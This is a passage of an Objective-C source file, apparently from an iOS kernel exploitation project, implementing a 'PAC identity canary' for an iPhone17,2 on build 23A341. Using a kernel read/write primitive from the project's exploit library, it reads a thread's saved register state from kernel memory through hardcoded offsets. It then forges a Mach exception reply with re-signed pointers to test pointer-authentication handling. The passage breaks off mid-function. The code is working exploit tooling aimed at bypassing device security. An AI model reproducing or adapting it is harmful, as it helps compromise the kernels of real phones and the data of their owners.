#import "CNDPhysicalPACIdentityCanary.h"

#import "../TaskRop/Thread.h"
#import "../kexploit/CNDLabKernelProvider.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/kutils.h"
#import "../kexploit/xpaci.h"

#include <errno.h>
#include <mach/arm/thread_status.h>
#include <mach/exc.h>
#include <mach/mach.h>
#include <mach/task_special_ports.h>
#include <poll.h>
#include <pthread.h>
#include <ptrauth.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <sys/sysctl.h>
#include <sys/wait.h>
#include <unistd.h>

#define CND_PAC_CANARY_PRODUCT "iPhone17,2"
#define CND_PAC_CANARY_BUILD "23A341"
#define CND_PAC_CANARY_TIMEOUT_MS 5000
#define CND_PAC_CANARY_IDENTITY_MESSAGE_ID 2407
#define CND_PAC_CANARY_USER_POINTER_MASK UINT64_C(0x0000007fffffffff)
#define CND_PAC_CANARY_VALIDATOR_X16 UINT64_C(0x434e4456414c3136)
#define CND_PAC_CANARY_RESUME_SPIN_LDAR_OFFSET UINT64_C(0x14)
#define CND_PAC_CANARY_RESUME_SPIN_CBZ_OFFSET UINT64_C(0x18)

/* Exact iPhone17,2 / 23A341 A18 Pro saved-state layout.  These values are
 * checked against the initialized runtime offsets before any state read. */
#define CND_PAC_CANARY_THREAD_CONTEXT_DATA_OFFSET UINT32_C(0x100)
#define CND_PAC_CANARY_THREAD_UPCB_OFFSET UINT32_C(0x108)
#define CND_PAC_CANARY_THREAD_UNEON_OFFSET UINT32_C(0x110)
#define CND_PAC_CANARY_SAVED_STATE_SIZE UINT32_C(0x130)
#define CND_PAC_CANARY_SAVED_STATE_X16_OFFSET UINT32_C(0x88)
#define CND_PAC_CANARY_SAVED_STATE_X17_OFFSET UINT32_C(0x90)
#define CND_PAC_CANARY_SAVED_STATE_LR_OFFSET UINT32_C(0xf8)
#define CND_PAC_CANARY_SAVED_STATE_SP_OFFSET UINT32_C(0x100)
#define CND_PAC_CANARY_SAVED_STATE_PC_OFFSET UINT32_C(0x108)
#define CND_PAC_CANARY_SAVED_STATE_CPSR_OFFSET UINT32_C(0x110)
#define CND_PAC_CANARY_SAVED_STATE_JOP_HASH_OFFSET UINT32_C(0x128)
#define CND_PAC_CANARY_SAVED_STATE_FLAVOR UINT32_C(21)
#define CND_PAC_CANARY_SAVED_STATE_COUNT UINT32_C(74)

#ifndef MPO_PROVISIONAL_ID_PROT_OPTOUT
#define MPO_PROVISIONAL_ID_PROT_OPTOUT 0x8000
#endif

typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t thread;
    mach_msg_port_descriptor_t task;
    NDR_record_t NDR;
    exception_type_t exception;
    mach_msg_type_number_t codeCnt;
    int64_t code[2];
    int flavor;
    mach_msg_type_number_t old_stateCnt;
    natural_t old_state[1296];
} __attribute__((packed, aligned(4))) CNDPhysicalPACIdentityRequest;

typedef struct {
    mach_msg_header_t Head;
    NDR_record_t NDR;
    kern_return_t RetCode;
    int flavor;
    mach_msg_type_number_t new_stateCnt;
    natural_t new_state[1296];
} __attribute__((packed, aligned(4))) CNDPhysicalPACIdentityReply;

typedef struct {
    uint64_t resumedX16;
    uint64_t resumedX17;
    uint32_t resumed;
    uint32_t release;
} __attribute__((aligned(16))) CNDPhysicalPACResumeGate;

_Static_assert(offsetof(CNDPhysicalPACResumeGate, resumedX16) == 0,
    "resume-gate x16 layout changed");
_Static_assert(offsetof(CNDPhysicalPACResumeGate, resumedX17) == 8,
    "resume-gate x17 layout changed");
_Static_assert(offsetof(CNDPhysicalPACResumeGate, resumed) == 16,
    "resume-gate flag layout changed");
_Static_assert(offsetof(CNDPhysicalPACResumeGate, release) == 20,
    "resume-gate release layout changed");

typedef struct {
    mach_port_t exceptionPort;
    int readyWriteFD;
    int goReadFD;
    CNDPhysicalPACResumeGate *resumeGate;
} CNDPhysicalPACWorkerContext;

typedef struct {
    kern_return_t setupKR;
    mach_port_t threadPort;
    uint64_t resumePC;
    uint64_t fallbackLR;
} CNDPhysicalPACWorkerReady;

typedef struct {
    pid_t pid;
    kern_return_t inheritedPortKR;
    kern_return_t exceptionSetupKR;
    uint64_t resumePC;
    uint64_t fallbackLR;
} CNDPhysicalPACCrossTaskReady;

typedef struct {
    BOOL valid;
    BOOL layoutOffsetsExact;
    uint64_t rawContextData;
    uint64_t contextData;
    uint64_t rawUPCB;
    uint64_t savedState;
    uint64_t rawUNeon;
    uint64_t uNeon;
    uint32_t flavor;
    uint32_t count;
    uint64_t x16;
    uint64_t x17;
    uint64_t lr;
    uint64_t sp;
    uint64_t pc;
    uint32_t cpsr;
    uint64_t jopHash;
    uint8_t bytes[CND_PAC_CANARY_SAVED_STATE_SIZE];
} CNDPhysicalPACSavedStateSnapshot;

static volatile int32_t gCNDPhysicalPACCanaryRunning;
static volatile int32_t gCNDPhysicalPACCrossTaskCanaryRunning;

static NSString *CNDPhysicalPACSysctlString(const char *name)
{
    char value[96] = {0};
    size_t length = sizeof(value);
    if (sysctlbyname(name, value, &length, NULL, 0) != 0 || !value[0]) {
        return @"";
    }
    return [NSString stringWithUTF8String:value] ?: @"";
}

static NSString *CNDPhysicalPACHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static uint64_t CNDPhysicalPACLoad64(const uint8_t *bytes, size_t offset)
{
    uint64_t value = 0;
    memcpy(&value, bytes + offset, sizeof(value));
    return value;
}

static uint32_t CNDPhysicalPACLoad32(const uint8_t *bytes, size_t offset)
{
    uint32_t value = 0;
    memcpy(&value, bytes + offset, sizeof(value));
    return value;
}

static BOOL CNDPhysicalPACCaptureSavedState(
    uint64_t thread, CNDPhysicalPACSavedStateSnapshot *snapshot)
{
    if (!snapshot) return NO;
    memset(snapshot, 0, sizeof(*snapshot));

    snapshot->layoutOffsetsExact =
        off_thread_machine_contextdata ==
            CND_PAC_CANARY_THREAD_CONTEXT_DATA_OFFSET &&
        off_thread_machine_upcb == CND_PAC_CANARY_THREAD_UPCB_OFFSET &&
        off_arm_saved_state_uss_ss_64 == UINT32_C(0x8) &&
        off_arm_saved_state64_lr == UINT32_C(0xf0) &&
        off_arm_saved_state64_pc == UINT32_C(0x100);
    if (!snapshot->layoutOffsetsExact || !is_kaddr_valid(thread)) return NO;

    snapshot->rawContextData = kread64(
        thread + CND_PAC_CANARY_THREAD_CONTEXT_DATA_OFFSET);
    snapshot->contextData = xpaci(snapshot->rawContextData);
    snapshot->rawUPCB = kread64(
        thread + CND_PAC_CANARY_THREAD_UPCB_OFFSET);
    snapshot->savedState = xpaci(snapshot->rawUPCB);
    snapshot->rawUNeon = kread64(
        thread + CND_PAC_CANARY_THREAD_UNEON_OFFSET);
    snapshot->uNeon = xpaci(snapshot->rawUNeon);

    if (!is_kaddr_valid(snapshot->contextData) ||
        !is_kaddr_valid(snapshot->savedState) ||
        !is_kaddr_valid(snapshot->uNeon) ||
        !is_kaddr_valid(snapshot->savedState +
            CND_PAC_CANARY_SAVED_STATE_SIZE - 1) ||
        snapshot->contextData != snapshot->savedState ||
        snapshot->uNeon != snapshot->savedState +
            CND_PAC_CANARY_SAVED_STATE_SIZE) {
        return NO;
    }

    kreadbuf(snapshot->savedState, snapshot->bytes,
        sizeof(snapshot->bytes));
    snapshot->flavor = CNDPhysicalPACLoad32(snapshot->bytes, 0);
    snapshot->count = CNDPhysicalPACLoad32(snapshot->bytes, 4);
    snapshot->x16 = CNDPhysicalPACLoad64(snapshot->bytes,
        CND_PAC_CANARY_SAVED_STATE_X16_OFFSET);
    snapshot->x17 = CNDPhysicalPACLoad64(snapshot->bytes,
        CND_PAC_CANARY_SAVED_STATE_X17_OFFSET);
    snapshot->lr = CNDPhysicalPACLoad64(snapshot->bytes,
        CND_PAC_CANARY_SAVED_STATE_LR_OFFSET);
    snapshot->sp = CNDPhysicalPACLoad64(snapshot->bytes,
        CND_PAC_CANARY_SAVED_STATE_SP_OFFSET);
    snapshot->pc = CNDPhysicalPACLoad64(snapshot->bytes,
        CND_PAC_CANARY_SAVED_STATE_PC_OFFSET);
    snapshot->cpsr = CNDPhysicalPACLoad32(snapshot->bytes,
        CND_PAC_CANARY_SAVED_STATE_CPSR_OFFSET);
    snapshot->jopHash = CNDPhysicalPACLoad64(snapshot->bytes,
        CND_PAC_CANARY_SAVED_STATE_JOP_HASH_OFFSET);
    snapshot->valid = snapshot->flavor ==
        CND_PAC_CANARY_SAVED_STATE_FLAVOR &&
        snapshot->count == CND_PAC_CANARY_SAVED_STATE_COUNT;
    return snapshot->valid;
}

static NSDictionary<NSString *, id> *CNDPhysicalPACSnapshotDictionary(
    const CNDPhysicalPACSavedStateSnapshot *snapshot)
{
    if (!snapshot) return @{};
    return @{
        @"valid": @(snapshot->valid),
        @"layoutOffsetsExact": @(snapshot->layoutOffsetsExact),
        @"rawContextData": CNDPhysicalPACHex(snapshot->rawContextData),
        @"contextData": CNDPhysicalPACHex(snapshot->contextData),
        @"rawUPCB": CNDPhysicalPACHex(snapshot->rawUPCB),
        @"savedState": CNDPhysicalPACHex(snapshot->savedState),
        @"rawUNeon": CNDPhysicalPACHex(snapshot->rawUNeon),
        @"uNeon": CNDPhysicalPACHex(snapshot->uNeon),
        @"flavor": @(snapshot->flavor),
        @"count": @(snapshot->count),
        @"x16": CNDPhysicalPACHex(snapshot->x16),
        @"x17": CNDPhysicalPACHex(snapshot->x17),
        @"lr": CNDPhysicalPACHex(snapshot->lr),
        @"sp": CNDPhysicalPACHex(snapshot->sp),
        @"pc": CNDPhysicalPACHex(snapshot->pc),
        @"cpsr": [NSString stringWithFormat:@"0x%08x", snapshot->cpsr],
        @"jopHash": CNDPhysicalPACHex(snapshot->jopHash),
    };
}

static NSUInteger CNDPhysicalPACChangedByteCount(
    const CNDPhysicalPACSavedStateSnapshot *before,
    const CNDPhysicalPACSavedStateSnapshot *after)
{
    if (!before || !after) return 0;
    NSUInteger changed = 0;
    for (size_t index = 0; index < sizeof(before->bytes); index++) {
        if (before->bytes[index] != after->bytes[index]) changed++;
    }
    return changed;
}

static BOOL CNDPhysicalPACWaitForResumeGate(
    CNDPhysicalPACResumeGate *gate, int timeoutMS)
{
    if (!gate || timeoutMS < 0) return NO;
    int elapsedMS = 0;
    while (elapsedMS <= timeoutMS) {
        if (__atomic_load_n(&gate->resumed, __ATOMIC_ACQUIRE) == 1) {
            return YES;
        }
        usleep(1000);
        elapsedMS++;
    }
    return NO;
}

static int CNDPhysicalPACWriteAll(int fd, const void *buffer, size_t length)
{
    const uint8_t *cursor = buffer;
    while (length > 0) {
        ssize_t amount = write(fd, cursor, length);
        if (amount < 0 && errno == EINTR) continue;
        if (amount <= 0) return errno ? errno : EIO;
        cursor += (size_t)amount;
        length -= (size_t)amount;
    }
    return 0;
}

static int CNDPhysicalPACReadAllWithTimeout(int fd, void *buffer,
                                            size_t length, int timeoutMS)
{
    uint8_t *cursor = buffer;
    while (length > 0) {
        struct pollfd pollFD = {
            .fd = fd,
            .events = POLLIN,
        };
        int ready;
        do {
            ready = poll(&pollFD, 1, timeoutMS);
        } while (ready < 0 && errno == EINTR);
        if (ready == 0) return ETIMEDOUT;
        if (ready < 0) return errno;
        if ((pollFD.revents & (POLLERR | POLLNVAL)) != 0) return EIO;

        ssize_t amount = read(fd, cursor, length);
        if (amount < 0 && errno == EINTR) continue;
        if (amount <= 0) return amount == 0 ? EPIPE : errno;
        cursor += (size_t)amount;
        length -= (size_t)amount;
    }
    return 0;
}

__attribute__((noinline, noreturn))
static void CNDPhysicalPACWorkerFallback(void)
{
    pthread_exit(NULL);
    __builtin_unreachable();
}

__attribute__((noinline, noreturn))
static void CNDPhysicalPACCrossTaskFallback(void)
{
    _exit(18);
}

static uint64_t CNDPhysicalPACRawFunctionPointer(void (*function)(void))
{
#if __has_feature(ptrauth_calls)
    return (uint64_t)(uintptr_t)ptrauth_strip(
        function, ptrauth_key_function_pointer) &
        CND_PAC_CANARY_USER_POINTER_MASK;
#else
    return (uint64_t)(uintptr_t)function & CND_PAC_CANARY_USER_POINTER_MASK;
#endif
}

/* Runs after fork without Objective-C or allocation.  The parent's exception
 * send right is the child's bootstrap special port, so no global bootstrap
 * registration or sandbox extension is needed. */
static int CNDPhysicalPACCrossTaskChildMain(int readyWriteFD,
                                            int resultWriteFD)
{
    CNDPhysicalPACCrossTaskReady ready = {
        .pid = getpid(),
        .inheritedPortKR = KERN_FAILURE,
        .exceptionSetupKR = KERN_FAILURE,
    };
    mach_port_t exceptionPort = MACH_PORT_NULL;
    ready.inheritedPortKR = task_get_bootstrap_port(
        mach_task_self(), &exceptionPort);
    mach_port_t selfThread = MACH_PORT_NULL;
    if (ready.inheritedPortKR == KERN_SUCCESS &&
        MACH_PORT_VALID(exceptionPort)) {
        selfThread = mach_thread_self();
        ready.exceptionSetupKR = thread_set_exception_ports(
            selfThread, EXC_MASK_BREAKPOINT, exceptionPort,
            EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES,
            ARM_THREAD_STATE64);
    }
    ready.resumePC = ((uint64_t)(uintptr_t)&&resumed) &
        CND_PAC_CANARY_USER_POINTER_MASK;
    ready.fallbackLR = CNDPhysicalPACRawFunctionPointer(
        CNDPhysicalPACCrossTaskFallback);

    if (MACH_PORT_VALID(selfThread)) {
        (void)mach_port_deallocate(mach_task_self(), selfThread);
    }
    if (MACH_PORT_VALID(exceptionPort)) {
        (void)mach_port_deallocate(mach_task_self(), exceptionPort);
    }
    if (CNDPhysicalPACWriteAll(readyWriteFD, &ready, sizeof(ready)) != 0) {
        return 20;
    }
    if (ready.inheritedPortKR != KERN_SUCCESS ||
        ready.exceptionSetupKR != KERN_SUCCESS) {
        return 21;
    }

    __asm__ volatile("brk #0x436" ::: "memory");

resumed:
    {
        uint8_t didResume = 1;
        return CNDPhysicalPACWriteAll(resultWriteFD, &didResume,
            sizeof(didResume)) == 0 ? 0 : 22;
    }
}

static int CNDPhysicalPACWaitPID(pid_t child, int *statusOut, int timeoutMS)
{
    int elapsedMS = 0;
    while (elapsedMS <= timeoutMS) {
        pid_t result = waitpid(child, statusOut, WNOHANG);
        if (result == child) return 0;
        if (result < 0 && errno != EINTR) return errno;
        usleep(10000);
        elapsedMS += 10;
    }
    return ETIMEDOUT;
}

static void *CNDPhysicalPACWorker(void *opaque)
{
    CNDPhysicalPACWorkerContext *context = opaque;
    CNDPhysicalPACWorkerReady ready = {0};
    ready.threadPort = mach_thread_self();
    ready.setupKR = thread_set_exception_ports(
        ready.threadPort, EXC_MASK_BREAKPOINT, context->exceptionPort,
        EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES,
        ARM_THREAD_STATE64);
    ready.resumePC = ((uint64_t)(uintptr_t)&&resumed) &
        CND_PAC_CANARY_USER_POINTER_MASK;
    ready.fallbackLR = CNDPhysicalPACRawFunctionPointer(
        CNDPhysicalPACWorkerFallback);

    if (CNDPhysicalPACWriteAll(context->readyWriteFD, &ready,
            sizeof(ready)) != 0 || ready.setupKR != KERN_SUCCESS) {
        return NULL;
    }

    uint8_t go = 0;
    if (CNDPhysicalPACReadAllWithTimeout(context->goReadFD, &go,
            sizeof(go), CND_PAC_CANARY_TIMEOUT_MS) != 0 || go != 1) {
        return NULL;
    }

    /* x15 carries a userspace gate address in the exception state.  The
     * resumed label begins with an operand-free asm block so compiler-generated
     * code cannot touch x16/x17 before they are captured.  The thread then
     * spins without a syscall, leaving its upcb as the just-consumed exception
     * state while the controller snapshots it by KRW. */
    __asm__ volatile(
        "mov x15, %x[gate]\n"
        "brk #0x435\n"
        :
        : [gate] "r"(context->resumeGate)
        : "x15", "memory");

resumed:
    __asm__ volatile(
        "stp x16, x17, [x15, #%c[x16_offset]]\n"
        "mov w9, #1\n"
        "add x10, x15, #%c[resumed_offset]\n"
        "stlr w9, [x10]\n"
        "add x10, x15, #%c[release_offset]\n"
        "1:\n"
        "ldar w9, [x10]\n"
        "cbz w9, 1b\n"
        :
        : [x16_offset] "i"(offsetof(
              CNDPhysicalPACResumeGate, resumedX16)),
          [resumed_offset] "i"(offsetof(
              CNDPhysicalPACResumeGate, resumed)),
          [release_offset] "i"(offsetof(
              CNDPhysicalPACResumeGate, release))
        : "x9", "x10", "memory");
    return NULL;
}

static mach_port_t CNDPhysicalPACCreateExceptionPort(void)
{
    mach_port_options_t options = {
        .flags = MPO_INSERT_SEND_RIGHT | MPO_PROVISIONAL_ID_PROT_OPTOUT,
        .mpl = { .mpl_qlimit = 1 },
    };
    mach_port_t port = MACH_PORT_NULL;
    if (mach_port_construct(mach_task_self(), &options, 0, &port) !=
        KERN_SUCCESS) {
        return MACH_PORT_NULL;
    }
    return port;
}

static kern_return_t CNDPhysicalPACReceiveIdentity(
    mach_port_t receivePort, CNDPhysicalPACIdentityRequest *request)
{
    union {
        CNDPhysicalPACIdentityRequest request;
        uint8_t bytes[sizeof(CNDPhysicalPACIdentityRequest) +
            sizeof(mach_msg_max_trailer_t)];
    } receive = {0};
    kern_return_t kr = mach_msg(&receive.request.Head,
        MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(receive), receivePort,
        CND_PAC_CANARY_TIMEOUT_MS, MACH_PORT_NULL);
    if (kr == KERN_SUCCESS) *request = receive.request;
    return kr;
}

static BOOL CNDPhysicalPACRequestIsValid(
    const CNDPhysicalPACIdentityRequest *request)
{
    size_t requiredSize = offsetof(CNDPhysicalPACIdentityRequest, old_state) +
        sizeof(arm_thread_state64_internal);
    return request &&
        request->Head.msgh_id == CND_PAC_CANARY_IDENTITY_MESSAGE_ID &&
        request->Head.msgh_size >= requiredSize &&
        (request->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) != 0 &&
        request->msgh_body.msgh_descriptor_count == 2 &&
        request->thread.type == MACH_MSG_PORT_DESCRIPTOR &&
        request->task.type == MACH_MSG_PORT_DESCRIPTOR &&
        MACH_PORT_VALID(request->thread.name) &&
        MACH_PORT_VALID(request->task.name) &&
        request->flavor == ARM_THREAD_STATE64 &&
        request->old_stateCnt == ARM_THREAD_STATE64_COUNT;
}

static kern_return_t CNDPhysicalPACReplyIdentity(
    const CNDPhysicalPACIdentityRequest *request,
    const arm_thread_state64_internal *state)
{
    CNDPhysicalPACIdentityReply reply = {0};
    reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
    reply.Head.msgh_remote_port = request->Head.msgh_remote_port;
    reply.Head.msgh_id = request->Head.msgh_id + 100;
    reply.NDR = request->NDR;
    reply.RetCode = KERN_SUCCESS;
    reply.flavor = ARM_THREAD_STATE64;
    reply.new_stateCnt = ARM_THREAD_STATE64_COUNT;
    memcpy(reply.new_state, state, sizeof(*state));
    reply.Head.msgh_size = (mach_msg_size_t)(
        offsetof(CNDPhysicalPACIdentityReply, new_state) + sizeof(*state));
    return mach_msg(&reply.Head, MACH_SEND_MSG, reply.Head.msgh_size, 0,
        MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}

static NSDictionary<NSString *, id> *CNDPhysicalPACRunOnce(void)
{
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.physical-pac-identity-canary",
        @"schemaVersion": @2,
        @"productType": CNDPhysicalPACSysctlString("hw.machine"),
        @"productBuildVersion": CNDPhysicalPACSysctlString("kern.osversion"),
        @"krwUsed": @YES,
        @"kernelReadUsed": @YES,
        @"kernelWriteUsed": @NO,
        @"kernelCallUsed": @NO,
        @"persistentMutation": @NO,
        @"sacrificialWorkerThread": @YES,
        @"sacrificialForkChild": @NO,
        @"postResumeSyscallBeforeSnapshot": @NO,
        @"exceptionBehavior": @"EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES",
        @"direction": @"THREAD_CONVERT_THREAD_STATE_FROM_SELF",
        @"startedAt": @([[NSDate date] timeIntervalSince1970]),
    } mutableCopy];

    if (!kexploit_krw_ready()) {
        report[@"result"] = @"refused-krw-unavailable";
        report[@"message"] = @"Validated physical KRW is required.";
        return report;
    }

    mach_port_t exceptionPort = CNDPhysicalPACCreateExceptionPort();
    report[@"exceptionPortCreated"] = @(MACH_PORT_VALID(exceptionPort));
    if (!MACH_PORT_VALID(exceptionPort)) {
        report[@"result"] = @"failed-exception-port";
        return report;
    }

    int readyPipe[2] = {-1, -1};
    int goPipe[2] = {-1, -1};
    pthread_t worker = (pthread_t)0;
    BOOL workerCreated = NO;
    CNDPhysicalPACResumeGate resumeGate = {0};
    CNDPhysicalPACSavedStateSnapshot beforeSnapshot = {0};
    CNDPhysicalPACSavedStateSnapshot afterSnapshot = {0};
    BOOL beforeSnapshotCaptured = NO;
    BOOL afterSnapshotCaptured = NO;
    CNDPhysicalPACWorkerReady ready = {0};
    CNDPhysicalPACIdentityRequest request = {0};
    BOOL requestReceived = NO;
    BOOL replySent = NO;
    BOOL workerResumed = NO;

    if (pipe(readyPipe) != 0 || pipe(goPipe) != 0) {
        report[@"result"] = @"failed-pipe-setup";
        report[@"errno"] = @(errno);
        goto cleanup;
    }

    CNDPhysicalPACWorkerContext context = {
        .exceptionPort = exceptionPort,
        .readyWriteFD = readyPipe[1],
        .goReadFD = goPipe[0],
        .resumeGate = &resumeGate,
    };
    int pthreadResult = pthread_create(&worker, NULL,
        CNDPhysicalPACWorker, &context);
    report[@"pthreadCreateResult"] = @(pthreadResult);
    if (pthreadResult != 0) {
        report[@"result"] = @"failed-worker-create";
        goto cleanup;
    }
    workerCreated = YES;

    int readyRead = CNDPhysicalPACReadAllWithTimeout(readyPipe[0], &ready,
        sizeof(ready), CND_PAC_CANARY_TIMEOUT_MS);
    report[@"workerReadyRead"] = @(readyRead);
    report[@"workerExceptionSetupKR"] = @(ready.setupKR);
    if (readyRead != 0 || ready.setupKR != KERN_SUCCESS ||
        !MACH_PORT_VALID(ready.threadPort) || !ready.resumePC ||
        !ready.fallbackLR) {
        report[@"result"] = @"failed-worker-setup";
        goto cleanup;
    }

    uint64_t selfTask = task_self();
    uint64_t taskControlObject = task_get_ipc_port_object(
        selfTask, mach_task_self());
    uint64_t workerControlObject = task_get_ipc_port_object(
        selfTask, ready.threadPort);
    uint64_t workerThread = task_get_ipc_port_kobject(
        selfTask, ready.threadPort);
    BOOL preflightIdentity = selfTask && taskControlObject &&
        workerControlObject && workerThread &&
        thread_get_task(workerThread) == selfTask;
    report[@"krwPreflightIdentityVerified"] = @(preflightIdentity);
    report[@"selfTask"] = CNDPhysicalPACHex(selfTask);
    report[@"taskControlIPCObject"] = CNDPhysicalPACHex(taskControlObject);
    report[@"workerControlIPCObject"] = CNDPhysicalPACHex(workerControlObject);
    report[@"workerThread"] = CNDPhysicalPACHex(workerThread);
    if (!preflightIdentity) {
        report[@"result"] = @"failed-krw-preflight";
        goto cleanup;
    }

    {
        uint8_t go = 1;
        int goWrite = CNDPhysicalPACWriteAll(goPipe[1], &go, sizeof(go));
        report[@"workerReleaseResult"] = @(goWrite);
        if (goWrite != 0) {
            report[@"result"] = @"failed-worker-release";
            goto cleanup;
        }
    }

    kern_return_t receiveKR = CNDPhysicalPACReceiveIdentity(
        exceptionPort, &request);
    report[@"receiveKR"] = @(receiveKR);
    requestReceived = receiveKR == KERN_SUCCESS;
    BOOL requestValid = requestReceived &&
        CNDPhysicalPACRequestIsValid(&request);
    report[@"identityMessageValid"] = @(requestValid);
    report[@"messageID"] = @(request.Head.msgh_id);
    report[@"messageSize"] = @(request.Head.msgh_size);
    report[@"descriptorCount"] = @(request.msgh_body.msgh_descriptor_count);
    report[@"stateFlavor"] = @(request.flavor);
    report[@"stateCount"] = @(request.old_stateCnt);
    if (!requestValid) {
        report[@"result"] = @"failed-identity-message";
        goto cleanup;
    }

    uint64_t deliveredThreadObject = task_get_ipc_port_object(
        selfTask, request.thread.name);
    uint64_t deliveredTaskObject = task_get_ipc_port_object(
        selfTask, request.task.name);
    uint64_t deliveredThread = task_get_ipc_port_kobject(
        selfTask, request.thread.name);
    uint64_t deliveredTask = task_get_ipc_port_kobject(
        selfTask, request.task.name);
    BOOL exactThreadRight = deliveredThreadObject == workerControlObject &&
        deliveredThread == workerThread;
    BOOL exactTaskRight = deliveredTaskObject == taskControlObject &&
        deliveredTask == selfTask;
    report[@"deliveredThreadIPCObject"] =
        CNDPhysicalPACHex(deliveredThreadObject);
    report[@"deliveredTaskIPCObject"] = CNDPhysicalPACHex(deliveredTaskObject);
    report[@"deliveredThread"] = CNDPhysicalPACHex(deliveredThread);
    report[@"deliveredTask"] = CNDPhysicalPACHex(deliveredTask);
    report[@"exactThreadControlRight"] = @(exactThreadRight);
    report[@"exactTaskControlRight"] = @(exactTaskRight);
    if (!exactThreadRight || !exactTaskRight) {
        report[@"result"] = @"failed-delivered-control-right-identity";
        goto cleanup;
    }

    beforeSnapshotCaptured = CNDPhysicalPACCaptureSavedState(
        deliveredThread, &beforeSnapshot);
    report[@"savedStateBefore"] = CNDPhysicalPACSnapshotDictionary(
        &beforeSnapshot);
    report[@"savedStateBeforeCaptured"] = @(beforeSnapshotCaptured);
    if (!beforeSnapshotCaptured) {
        report[@"result"] = @"failed-physical-saved-state-layout";
        goto cleanup;
    }

    arm_thread_state64_internal convertedState = {0};
    memcpy(&convertedState, request.old_state, sizeof(convertedState));
    uint64_t retainedX17 = convertedState.__x[17];
    BOOL deliveredConversion = thread_convert_sign_state_for_target(
        request.thread.name, &convertedState, ready.resumePC,
        ready.fallbackLR);
    report[@"deliveredRightConversionSucceeded"] = @(deliveredConversion);

    BOOL rescueConversion = NO;
    if (!deliveredConversion) {
        memcpy(&convertedState, request.old_state, sizeof(convertedState));
        rescueConversion = thread_convert_sign_state_for_target(
            ready.threadPort, &convertedState, ready.resumePC,
            ready.fallbackLR);
    }
    report[@"controlRightRescueUsed"] = @(rescueConversion);

    convertedState.__x[16] = CND_PAC_CANARY_VALIDATOR_X16;
    BOOL retainedX17Exact = convertedState.__x[17] == retainedX17;
    BOOL resumeGatePointerPreserved = convertedState.__x[15] ==
        (uint64_t)(uintptr_t)&resumeGate;
    report[@"validatorMarkerX16"] = CNDPhysicalPACHex(
        CND_PAC_CANARY_VALIDATOR_X16);
    report[@"retainedX17"] = CNDPhysicalPACHex(retainedX17);
    report[@"retainedX17Exact"] = @(retainedX17Exact);
    report[@"resumeGatePointerPreserved"] = @(resumeGatePointerPreserved);

    uint64_t convertedPC = convertedState.__pc;
    uint64_t convertedLR = convertedState.__lr;
    BOOL convertedPointersMatch =
        (convertedPC & CND_PAC_CANARY_USER_POINTER_MASK) == ready.resumePC &&
        (convertedLR & CND_PAC_CANARY_USER_POINTER_MASK) == ready.fallbackLR;
    report[@"convertedPointersMatch"] = @(convertedPointersMatch);
    report[@"convertedPC"] = CNDPhysicalPACHex(convertedPC);
    report[@"convertedLR"] = CNDPhysicalPACHex(convertedLR);

    if ((deliveredConversion || rescueConversion) &&
        convertedPointersMatch && retainedX17Exact &&
        resumeGatePointerPreserved) {
        kern_return_t replyKR = CNDPhysicalPACReplyIdentity(
            &request, &convertedState);
        report[@"replyKR"] = @(replyKR);
        replySent = replyKR == KERN_SUCCESS;
    } else {
        report[@"replyKR"] = @(KERN_FAILURE);
    }

    if (replySent) {
        workerResumed = CNDPhysicalPACWaitForResumeGate(
            &resumeGate, CND_PAC_CANARY_TIMEOUT_MS);
        if (workerResumed) {
            afterSnapshotCaptured = CNDPhysicalPACCaptureSavedState(
                deliveredThread, &afterSnapshot);
        }
    }
    report[@"workerResumed"] = @(workerResumed);
    report[@"resumedX16"] = CNDPhysicalPACHex(resumeGate.resumedX16);
    report[@"resumedX17"] = CNDPhysicalPACHex(resumeGate.resumedX17);
    report[@"savedStateAfter"] = CNDPhysicalPACSnapshotDictionary(
        &afterSnapshot);
    report[@"savedStateAfterCaptured"] = @(afterSnapshotCaptured);

    NSUInteger changedByteCount = beforeSnapshotCaptured &&
        afterSnapshotCaptured
        ? CNDPhysicalPACChangedByteCount(&beforeSnapshot, &afterSnapshot) : 0;
    BOOL savedStateAddressStable = beforeSnapshotCaptured &&
        afterSnapshotCaptured &&
        beforeSnapshot.savedState == afterSnapshot.savedState;
    uint64_t afterPC = afterSnapshot.pc & CND_PAC_CANARY_USER_POINTER_MASK;
    BOOL savedStatePCInResumeSpin = afterSnapshotCaptured &&
        (afterPC == ready.resumePC +
            CND_PAC_CANARY_RESUME_SPIN_LDAR_OFFSET ||
         afterPC == ready.resumePC +
            CND_PAC_CANARY_RESUME_SPIN_CBZ_OFFSET);
    BOOL savedTupleConsumed = afterSnapshotCaptured &&
        afterSnapshot.x16 == CND_PAC_CANARY_VALIDATOR_X16 &&
        afterSnapshot.x17 == retainedX17 &&
        savedStatePCInResumeSpin &&
        (afterSnapshot.lr & CND_PAC_CANARY_USER_POINTER_MASK) ==
            ready.fallbackLR;
    BOOL resumedTupleExact = workerResumed &&
        resumeGate.resumedX16 == CND_PAC_CANARY_VALIDATOR_X16 &&
        resumeGate.resumedX17 == retainedX17;
    BOOL jopHashObserved = afterSnapshotCaptured &&
        afterSnapshot.jopHash != 0;
    BOOL jopHashChanged = beforeSnapshotCaptured &&
        afterSnapshotCaptured &&
        beforeSnapshot.jopHash != afterSnapshot.jopHash;
    BOOL returnedAsEL0t = afterSnapshotCaptured &&
        (afterSnapshot.cpsr & UINT32_C(0xf)) == 0;
    BOOL physicalValidatorConsumption = savedStateAddressStable &&
        savedTupleConsumed && resumedTupleExact && jopHashObserved &&
        jopHashChanged && returnedAsEL0t && changedByteCount != 0;
    report[@"savedStateAddressStable"] = @(savedStateAddressStable);
    report[@"savedStateChangedByteCount"] = @(changedByteCount);
    report[@"savedStatePCInResumeSpin"] = @(savedStatePCInResumeSpin);
